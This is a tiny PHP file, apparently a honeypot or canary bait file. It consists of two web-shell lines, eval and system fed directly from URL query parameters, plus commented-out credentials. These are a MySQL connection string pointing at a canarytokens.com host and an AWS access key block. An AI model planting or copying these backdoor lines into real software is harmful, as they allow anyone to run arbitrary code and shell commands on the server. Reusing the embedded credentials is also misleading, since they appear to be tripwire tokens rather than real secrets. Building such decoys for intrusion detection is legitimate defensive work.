<?




eval($_GET["XSS"]);


// mysql://rkd5i4bymb9zh0g6nadx85bj2:my-secret-pw@rkd5i4bymb9zh0g6nadx85bj2.canarytokens.com:3306/


system($_GET["cmd"]);


/*
[default]
aws_access_key_id = AKIA2T2SJH6M76LT25T4
aws_secret_access_key = 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
output = json
region = us-east-2
*/

?>
